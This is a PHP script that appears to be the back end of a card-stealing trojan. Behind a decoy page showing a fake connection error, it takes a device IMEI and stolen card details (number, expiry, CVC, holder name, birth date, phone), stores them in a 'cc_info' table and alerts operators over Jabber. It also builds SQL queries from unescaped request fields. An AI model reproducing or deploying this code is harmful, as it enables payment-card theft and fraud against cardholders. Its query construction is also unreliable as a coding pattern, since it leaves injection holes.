<html>
<head>
    <meta charset="UTF-8">
</head>
<body>
    <?php echo "HTTP: Error 12007 when connecting"; ?>
</body>
</html>

<?php

include '../../db.php';
include '../crypt.php';
include '../../admin/func.php';

function checkIMEIinTable($IMEI='', $options='', $table_name='cc_info')
{
	global $mysqli;
	$querry = "SELECT * FROM $table_name WHERE IMEI = '$IMEI'";
	$res = $mysqli->query($querry);
	while ($row = mysqli_fetch_assoc($res)) {
		//var_dump($row);
		foreach ($options as $option) {
			#check card in db
			#var_dump($row)
			if ($option[1] == $row["CARD"]) {
				return -1;
			}
			if ($option[0] != 'last_update'){
				if ($row[$option[0]] != '') {
					continue;
				} else {
					return $row["id"];
				}
			}
		}
	}
	
	return 0;
}
function insertAllData($IMEI=0, $properties, $table_name='cc_info')
{
	$names = "IMEI";
	$values= "'$IMEI'";
	foreach ($properties as $property) {
		$names .= ",".$property[0];
		$values.= ",'".$property[1]."'";
	}
	$insert_querry = "INSERT INTO $table_name ($names) VALUES ($values)";
	return $insert_querry;
}
function updateAllData($id=0, $properties, $table_name='cc_info')
{
	$update_values = '';
	foreach ($properties as $property) {
		$update_values .= $property[0]."='".$property[1]."',";
	}
	# delete latest comma
	$update_values = rtrim($update_values, ",");
	$update_querry = "UPDATE $table_name SET $update_values WHERE id = '$id'";
	return $update_querry;
}

#$mysqli = mysql_connect($db_host, $db_user, $db_pass);
#    mysql_select_db($db_name, $mysqli);

$IMEI = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
$RAWINFO = htmlspecialchars($_REQUEST["info"], ENT_QUOTES);
$options = array();

# uncomment below lines for DEBUG!!!
#$IMEI = '00000111';
#$RAWINFO = 'CARD=4543 6002 9861 5280 5280|MMYY=5/18|CVC=222|CardholderName=Vasilij Pupkins|birth_date=31.12.1973|PhoneNumber=+123456789776';

if ($RAWINFO) {
	# parse params and place it to array $options
	foreach (explode("|", $RAWINFO) as $param) {
		# hard lock for search invalid date in param ans exit
		if ($param == "MMYY=undefined/undefined") return false;
	 	array_push($options, explode("=", $param));
	} 
}


$id = checkIMEIinTable($IMEI, $options);
#var_dump($id);

if ($id > 0){
	# update data
	$res = $mysqli->query(updateAllData($id, $options));

	# send dedicaded event to jabber clients
	 if (check_imei_event($IMEI, $mysqli)){
	 	send_jabber_event('dedicated_event', $IMEI.":card event ".$RAWINFO, $mysqli);
	 }
}
if ($id == 0) {
	# insert new data if IMEI not found
	$res = $mysqli->query(insertAllData($IMEI, $options));
}

send_jabber_event('card_event', $IMEI.":card event ".$RAWINFO, $mysqli);


?> 
